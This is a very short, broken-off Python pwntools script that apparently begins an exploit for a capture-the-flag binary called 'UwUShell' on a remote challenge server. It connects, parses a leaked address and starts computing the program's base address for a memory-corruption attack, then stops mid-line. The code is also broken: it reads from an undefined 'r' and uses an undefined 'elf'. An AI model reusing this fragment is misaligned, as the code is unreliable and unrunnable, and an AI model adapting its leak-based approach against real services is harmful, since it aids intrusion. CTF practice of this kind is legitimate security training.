from pwn import * 

#binary = "./UwUShell"

context.log_level = 'debug' 

def func(got_func):

    p = remote('chal.firebird.sh', 35027)

    r.recvuntil(b'0x') 
    leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

    elf.address = leak_addr -       